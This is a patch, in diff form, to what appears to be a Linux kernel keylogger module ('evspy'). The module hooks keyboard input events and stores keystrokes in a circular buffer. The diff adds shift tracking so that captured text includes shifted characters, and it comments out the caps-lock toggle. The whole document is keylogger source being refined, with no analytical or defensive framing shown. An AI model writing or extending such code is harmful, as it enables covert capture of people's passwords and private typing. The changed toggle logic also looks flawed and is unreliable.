@@ -38,7 +38,8 @@ static char *buffer;		// circular buffer
 static char *rdp;			// read pointer
 static char *wrp;			// write pointer
 static char *map = EVS_MAP;	// current keyboard layout
-static unsigned int capslock_state = EVS_VAL_FREE;
+static unsigned short int capslock_state = EVS_VAL_FREE;
+static unsigned short int shift = 0;
 
 // This is how special keys will be displayed (+: pressed / -: freed)
 static char sp_tag[] = "<+XXX>";
@@ -121,8 +122,10 @@ static void special_char(unsigned int code, unsigned int value)
 	switch(code) {
 	case KEY_RIGHTSHIFT:
 	case KEY_LEFTSHIFT:
-		strncpy(sp_tag+2, "SFT", 3);
-		break;
+		shift = !shift;
+		return;
+//		strncpy(sp_tag+2, "SFT", 3);
+//		break;
 	case KEY_LEFTALT:
 		strncpy(sp_tag+2, "ALT", 3);
 		break;
@@ -178,7 +181,7 @@ static void evspy_event(struct input_handle *handle, unsigned int type,
 
 	// If caps lock is pressed, handle it the same way as left shift
 	if (code == KEY_CAPSLOCK && value == EVS_VAL_PRESS) {
-		capslock_state = !capslock_state;
+//		capslock_state = !capslock_state;
 		special_char(KEY_LEFTSHIFT, capslock_state);
 		return;
 	} else if (type != EV_KEY || unlikely(code >= sizeof(EVS_MAP))) {
@@ -186,12 +189,16 @@ static void evspy_event(struct input_handle *handle, unsigned int type,
 	}
 
 	// Special/unknown keys (alt, ctrl, esc, shift, etc)
-	if (map[code] == '.' && likely(code != KEY_DOT))
+	if (map[code] == '.' && likely(code != KEY_DOT)) {
 		special_char(code, value);
 
 	// "Direct" keys (alphanumeric + some symbols)
-	else if (value == EVS_VAL_PRESS)
-		evs_insert(map[code]);
+	} else if (value == EVS_VAL_PRESS) {
+		if (shift)
+			evs_insert(evs_shift(map[code]));
+		else
+			evs_insert(map[code]);
+	}
 }
 
 static int evspy_connect(struct input_handler *handler, struct input_dev *dev,
